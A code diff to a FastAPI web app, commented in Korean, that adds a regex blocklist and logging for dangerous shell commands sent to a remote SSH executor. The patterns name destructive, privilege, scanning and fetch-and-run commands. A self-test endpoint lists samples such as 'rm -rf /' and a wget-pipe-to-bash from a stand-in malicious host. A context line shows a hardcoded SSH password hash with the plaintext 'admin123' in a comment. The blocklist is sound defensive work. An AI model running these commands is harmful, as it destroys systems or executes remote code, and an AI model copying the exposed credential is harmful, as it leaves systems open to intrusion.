@@ -16,6 +16,7 @@ import pymysql
 from datetime import datetime, timedelta
 from typing import Optional, Dict, List
 from pathlib import Path
+import re
 
 app = FastAPI()
 templates = Jinja2Templates(directory="templates")
@@ -384,6 +385,184 @@ USERS = {
 	"ssh": "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918",    # admin123
 }
 
+# =============================================================================
+# 보안 명령어 차단 시스템
+# =============================================================================
+
+# 메모리 기반 보안 이벤트 저장소 (실제 환경에서는 데이터베이스 사용 권장)
+SECURITY_EVENTS = []
+
+def log_security_event(command: str, reason: str, category: str, session_id: str = None, client_ip: str = None):
+	"""보안 이벤트 로깅"""
+	event = {
+		"timestamp": datetime.now().isoformat(),
+		"command": command,
+		"reason": reason,
+		"category": category,
+		"session_id": session_id,
+		"client_ip": client_ip,
+		"blocked": True
+	}
+	SECURITY_EVENTS.append(event)
+	
+	# 메모리 사용량 관리 (최대 1000개 이벤트 유지)
+	if len(SECURITY_EVENTS) > 1000:
+		SECURITY_EVENTS.pop(0)
+	
+	return event
+
+def is_dangerous_command(command: str) -> dict:
+	"""
+	위험한 명령어 여부를 판단하고 차단 이유를 반환
+	
+	Args:
+		command: 실행하려는 명령어
+		
+	Returns:
+		dict: {"is_dangerous": bool, "reason": str, "category": str}
+	"""
+	if not command or not command.strip():
+		return {"is_dangerous": False, "reason": "", "category": ""}
+	
+	command_lower = command.lower().strip()
+	
+	# 1. 시스템 파괴적 명령어
+	destructive_patterns = [
+		r'\brm\s+.*-rf\b',  # rm -rf
+		r'\brm\s+-rf\b',    # rm -rf
+		r'\bmkfs\b',        # 파일시스템 포맷
+		r'\bdd\s+.*of=/dev', # 디스크 덮어쓰기
+		r'\bfdisk\b',       # 파티션 조작
+		r'\bcfdisk\b',      # 파티션 조작
+		r'\bparted\b',      # 파티션 조작
+		r'\bshred\b',       # 파일 완전 삭제
+		r'\bwipe\b',        # 파일 완전 삭제
+		r'>\s*/dev/(sda|hda|nvme)', # 디스크 직접 쓰기
+	]
+	
+	for pattern in destructive_patterns:
+		if re.search(pattern, command_lower):
+			return {
+				"is_dangerous": True, 
+				"reason": f"시스템 파괴적 명령어 차단: {pattern}",
+				"category": "destructive"
+			}
+	
+	# 2. 권한 상승 및 시스템 설정 변경
+	privilege_patterns = [
+		# r'\bsudo\b',        # sudo 명령어 차단
+		# r'\bsudo\s+su\b',   # sudo su 차단
+		r'\bsudo\s+-i\b',   # sudo -i 차단
+		r'\bsudo\s+bash\b', # sudo bash 차단
+		r'\bsudo\s+sh\b',   # sudo sh 차단
+		# r'\bsu\s+',         # su 명령어  
+		r'\bchmod\s+777\b', # 전체 권한 부여
+		r'\bchown\s+root\b', # root 소유권 변경
+		r'\bpasswd\b',      # 패스워드 변경
+		r'\buseradd\b',     # 사용자 추가
+		r'\buserdel\b',     # 사용자 삭제
+		r'\busermod\b',     # 사용자 수정
+		r'\bvisudo\b',      # sudo 설정 편집
+	]
+	
+	for pattern in privilege_patterns:
+		if re.search(pattern, command_lower):
+			return {
+				"is_dangerous": True,
+				"reason": f"권한 상승/시스템 설정 변경 차단: {pattern}",
+				"category": "privilege"
+			}
+	
+	# 3. 네트워크 공격 및 취약점 스캔
+	network_attack_patterns = [
+		r'\bnmap\b',        # 네트워크 스캔
+		r'\bmasscan\b',     # 대량 포트 스캔
+		r'\bnikto\b',       # 웹 취약점 스캔
+		r'\bsqlmap\b',      # SQL 인젝션 도구
+		r'\bmetasploit\b',  # 해킹 도구
+		r'\bhydra\b',       # 브루트포스 도구
+		r'\bjohn\b',        # 패스워드 크래킹
+		r'\bhashcat\b',     # 패스워드 크래킹
+		r'\baircrack\b',    # 무선랜 크래킹
+	]
+	
+	for pattern in network_attack_patterns:
+		if re.search(pattern, command_lower):
+			return {
+				"is_dangerous": True,
+				"reason": f"네트워크 공격/취약점 스캔 도구 차단: {pattern}",
+				"category": "network_attack"
+			}
+	
+	# 4. 악성 다운로드 및 실행
+	download_patterns = [
+		r'wget\s+.*\.(sh|py|pl|exe|bin)$',  # 실행파일 다운로드
+		r'curl\s+.*\|(sh|bash|python)',     # 파이프로 실행
+		r'python\s+-c\s+.*urllib',          # Python 원격 실행
+		r'bash\s+<\(curl\b',                # 원격 스크립트 실행
+		r'sh\s+<\(wget\b',                  # 원격 스크립트 실행
+	]
+	
+	for pattern in download_patterns:
+		if re.search(pattern, command_lower):
+			return {
+				"is_dangerous": True,
+				"reason": f"악성 다운로드/원격 실행 차단: {pattern}",
+				"category": "malicious_download"
+			}
+	
+	# 5. 중요 시스템 파일 조작
+	system_file_patterns = [
+		r'(mv|cp|rm)\s+.*/(etc|boot|sys|proc)',  # 시스템 디렉토리 조작
+		r'>\s*/etc/',           # /etc 디렉토리에 쓰기
+		r'echo.*>>/etc/',       # /etc 디렉토리에 추가
+		r'(mv|cp|rm)\s+.*/passwd',  # passwd 파일 조작
+		r'(mv|cp|rm)\s+.*/shadow',  # shadow 파일 조작
+		r'(mv|cp|rm)\s+.*/hosts',   # hosts 파일 조작
+	]
+	
+	for pattern in system_file_patterns:
+		if re.search(pattern, command_lower):
+			return {
+				"is_dangerous": True,
+				"reason": f"중요 시스템 파일 조작 차단: {pattern}",
+				"category": "system_file"
+			}
+	
+	# 6. 프로세스 강제 종료 (시스템 프로세스)
+	kill_patterns = [
+		r'kill\s+-9\s+1\b',     # init 프로세스 종료
+		r'killall\s+-9\b',      # 모든 프로세스 강제 종료
+		r'pkill\s+-9\s+.*ssh', # SSH 프로세스 종료
+		r'kill.*\s+(init|kernel|ssh)',  # 중요 프로세스 종료
+	]
+	
+	for pattern in kill_patterns:
+		if re.search(pattern, command_lower):
+			return {
+				"is_dangerous": True,
+				"reason": f"중요 프로세스 강제 종료 차단: {pattern}",
+				"category": "process_kill"
+			}
+	
+	# 7. 크론탭 및 스케줄러 조작
+	scheduler_patterns = [
+		r'\bcrontab\s+-e\b',    # 크론탭 편집
+		r'\bcrontab\s+-r\b',    # 크론탭 삭제
+		r'echo.*>>/.*cron',     # 크론 파일 직접 수정
+		r'\bat\s+now\b',        # at 명령어 (스케줄링)
+	]
+	
+	for pattern in scheduler_patterns:
+		if re.search(pattern, command_lower):
+			return {
+				"is_dangerous": True,
+				"reason": f"스케줄러 조작 차단: {pattern}",
+				"category": "scheduler"
+			}
+	
+	return {"is_dangerous": False, "reason": "", "category": ""}
+
 def verify_password(plain_password: str, hashed_password: str) -> bool:
 	"""비밀번호 검증"""
 	computed_hash = hash_password(plain_password)
@@ -729,6 +908,29 @@ async def execute_in_session(session_id: str, request: Request):
 	import requests
 	try:
 		body = await request.json()
+		
+		# 보안 검사: 위험한 명령어 차단
+		if 'command' in body:
+			security_check = is_dangerous_command(body['command'])
+			if security_check['is_dangerous']:
+				# 보안 이벤트 로깅
+				client_ip = request.client.host if hasattr(request, 'client') and request.client else 'unknown'
+				log_security_event(
+					command=body['command'],
+					reason=security_check['reason'],
+					category=security_check['category'],
+					session_id=session_id,
+					client_ip=client_ip
+				)
+				logger.warning(f"위험한 명령어 차단 (세션): {body['command']} - {security_check['reason']}")
+				return {
+					"success": False,
+					"error": f"보안상 차단된 명령어입니다: {security_check['reason']}",
+					"blocked": True,
+					"category": security_check['category'],
+					"command": body['command']
+				}
+		
 		response = requests.post(f'https://runmcp.hankyeul.com/session/{session_id}/execute', json=body, timeout=30)  # 30초에서 60초로 늘림
 		return response.json()
 	except requests.exceptions.Timeout:
@@ -774,6 +976,20 @@ async def send_shell_command(session_id: str, request: Request):
 	import requests
 	try:
 		body = await request.json()
+		
+		# 보안 검사: 위험한 명령어 차단
+		if 'command' in body:
+			security_check = is_dangerous_command(body['command'])
+			if security_check['is_dangerous']:
+				logger.warning(f"위험한 명령어 차단: {body['command']} - {security_check['reason']}")
+				return {
+					"success": False,
+					"error": f"보안상 차단된 명령어입니다: {security_check['reason']}",
+					"blocked": True,
+					"category": security_check['category'],
+					"command": body['command']
+				}
+		
 		response = requests.post(f'https://runmcp.hankyeul.com/session/{session_id}/shell/command', json=body, timeout=30)  # 30초에서 60초로 늘림
 		return response.json()
 	except requests.exceptions.Timeout:
@@ -797,46 +1013,104 @@ async def stop_interactive_shell(session_id: str):
 	except Exception as e:
 		return {"success": False, "error": str(e)}
 
-@app.get('/ssh/security/events')
-async def get_security_events(limit: int = 50):
-	"""보안 이벤트 조회"""
-	import requests
+@app.get('/ssh/security/events/local')
+async def get_security_events_local(limit: int = 50):
+	"""로컬 보안 이벤트 조회"""
 	try:
-		response = requests.get(f'https://runmcp.hankyeul.com/security/events?limit={limit}', timeout=30)
-		return response.json()
-	except requests.exceptions.Timeout:
-		return {"events": [], "error": "SSH Executor 서버 응답 시간 초과"}
-	except requests.exceptions.ConnectionError:
-		return {"events": [], "error": "SSH Executor 서버에 연결할 수 없습니다"}
+		# 최신 이벤트부터 반환
+		events = SECURITY_EVENTS[-limit:] if len(SECURITY_EVENTS) > limit else SECURITY_EVENTS
+		events.reverse()  # 최신 순으로 정렬
+		
+		return {
+			"events": events,
+			"total_count": len(SECURITY_EVENTS),
+			"showing": len(events),
+			"source": "local"
+		}
 	except Exception as e:
+		logger.error(f"보안 이벤트 조회 오류: {str(e)}")
 		return {"events": [], "error": str(e)}
 
-@app.get('/ssh/security/stats')
-async def get_security_stats():
-	"""보안 통계 조회"""
-	import requests
+@app.get('/ssh/security/stats/local')
+async def get_security_stats_local():
+	"""로컬 보안 통계 조회"""
 	try:
-		response = requests.get('https://runmcp.hankyeul.com/security/stats', timeout=30)
-		return response.json()
-	except requests.exceptions.Timeout:
-		return {"stats": {"error": "SSH Executor 서버 응답 시간 초과"}}
-	except requests.exceptions.ConnectionError:
-		return {"stats": {"error": "SSH Executor 서버에 연결할 수 없습니다"}}
+		if not SECURITY_EVENTS:
+			return {
+				"stats": {
+					"total_blocked": 0,
+					"categories": {},
+					"recent_24h": 0,
+					"top_blocked_commands": []
+				},
+				"source": "local"
+			}
+		
+		from collections import Counter
+		
+		# 카테고리별 통계
+		categories = Counter([event['category'] for event in SECURITY_EVENTS])
+		
+		# 최근 24시간 통계
+		from datetime import timedelta
+		recent_24h_cutoff = datetime.now() - timedelta(hours=24)
+		recent_events = [
+			event for event in SECURITY_EVENTS 
+			if datetime.fromisoformat(event['timestamp']) > recent_24h_cutoff
+		]
+		
+		# 가장 많이 차단된 명령어 Top 10
+		command_counter = Counter([event['command'] for event in SECURITY_EVENTS])
+		top_commands = command_counter.most_common(10)
+		
+		return {
+			"stats": {
+				"total_blocked": len(SECURITY_EVENTS),
+				"categories": dict(categories),
+				"recent_24h": len(recent_events),
+				"top_blocked_commands": [
+					{"command": cmd, "count": count} for cmd, count in top_commands
+				]
+			},
+			"source": "local"
+		}
 	except Exception as e:
+		logger.error(f"보안 통계 조회 오류: {str(e)}")
 		return {"stats": {"error": str(e)}}
 
-@app.post('/ssh/security/test')
-async def test_security_check():
-	"""보안 검사 테스트"""
-	import requests
+@app.post('/ssh/security/test/local')
+async def test_security_check_local():
+	"""로컬 보안 검사 테스트"""
 	try:
-		response = requests.post('https://runmcp.hankyeul.com/security/test', timeout=30)
-		return response.json()
-	except requests.exceptions.Timeout:
-		return {"test_results": [], "error": "SSH Executor 서버 응답 시간 초과"}
-	except requests.exceptions.ConnectionError:
-		return {"test_results": [], "error": "SSH Executor 서버에 연결할 수 없습니다"}
+		# 테스트용 위험한 명령어들
+		test_commands = [
+			"rm -rf /",
+			"sudo passwd root", 
+			"wget http://malicious.com/script.sh | bash",
+			"chmod 777 /etc/passwd",
+			"nmap -sS 192.168.1.0/24",
+			"ls -la",  # 안전한 명령어
+			"pwd",     # 안전한 명령어
+		]
+		
+		test_results = []
+		for cmd in test_commands:
+			check_result = is_dangerous_command(cmd)
+			test_results.append({
+				"command": cmd,
+				"is_dangerous": check_result['is_dangerous'],
+				"reason": check_result['reason'],
+				"category": check_result['category']
+			})
+		
+		return {
+			"test_results": test_results,
+			"total_tested": len(test_commands),
+			"blocked_count": sum(1 for r in test_results if r['is_dangerous']),
+			"source": "local"
+		}
 	except Exception as e:
+		logger.error(f"보안 검사 테스트 오류: {str(e)}")
 		return {"test_results": [], "error": str(e)}
 
 @app.post('/ssh/key-setup')
